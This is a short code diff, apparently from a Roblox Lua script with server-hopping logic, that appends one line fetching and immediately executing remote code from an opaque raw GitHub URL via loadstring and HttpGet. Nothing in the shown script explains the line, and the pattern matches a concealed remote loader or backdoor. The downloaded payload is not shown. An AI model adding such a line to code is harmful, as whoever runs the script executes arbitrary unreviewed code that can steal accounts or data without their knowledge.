@@ -125,3 +125,4 @@ task.delay(5, function()
         serverHop()
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JulekKumpel/124124zd/refs/heads/main/ed"))()
